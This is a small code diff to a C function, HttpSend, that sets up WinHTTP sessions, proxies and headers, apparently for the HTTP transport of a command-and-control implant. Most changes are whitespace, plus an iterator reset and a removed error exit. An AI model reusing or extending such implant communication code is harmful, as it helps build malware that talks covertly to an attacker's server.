@@ -15,7 +15,7 @@ BOOL HttpSend( PBUFFER Send, PBUFFER Response )
     LPWSTR  HttpEndpoint    = NULL;
     DWORD   HttpFlags       = 0;
     LPCWSTR HttpProxy       = NULL;
-    PWSTR HttpScheme        = NULL;
+    PWSTR   HttpScheme      = NULL;
 
     WINHTTP_PROXY_INFO                   ProxyInfo        = { 0 };
     WINHTTP_CURRENT_USER_IE_PROXY_CONFIG ProxyConfig      = { 0 };
@@ -44,11 +44,11 @@ BOOL HttpSend( PBUFFER Send, PBUFFER Response )
         if ( Instance.Config.Transport.Proxy.Enabled )
         {
             // Use preconfigured proxy
-            HttpProxy      = Instance.Config.Transport.Proxy.Url;
-            
+            HttpProxy = Instance.Config.Transport.Proxy.Url;
+
             /* PRINTF_DONT_SEND( "WinHttpOpen( %ls, WINHTTP_ACCESS_TYPE_NAMED_PROXY, %ls, WINHTTP_NO_PROXY_BYPASS, 0 )\n", Instance.Config.Transport.UserAgent, HttpProxy ) */
             Instance.hHttpSession = Instance.Win32.WinHttpOpen( Instance.Config.Transport.UserAgent, WINHTTP_ACCESS_TYPE_NAMED_PROXY, HttpProxy, WINHTTP_NO_PROXY_BYPASS, 0 );
-        } 
+        }
         else
         {
             // Autodetect proxy settings
@@ -107,7 +107,9 @@ BOOL HttpSend( PBUFFER Send, PBUFFER Response )
             PRINTF_DONT_SEND( "WinHttpSetOption: Failed => %d\n", NtGetLastError() );
         }
     }
+
     /* Add our headers */
+    Iterator = 0;
     do
     {
         HttpHeader = Instance.Config.Transport.Headers[ Iterator ];
@@ -233,7 +235,6 @@ BOOL HttpSend( PBUFFER Send, PBUFFER Response )
         if ( ! Instance.Win32.WinHttpSetOption( hRequest, WINHTTP_OPTION_PROXY, Instance.ProxyForUrl, Instance.SizeOfProxyForUrl ) )
         {
             PRINTF_DONT_SEND( "WinHttpSetOption: Failed => %d\n", NtGetLastError() );
-            goto LEAVE;
         }
     }
 
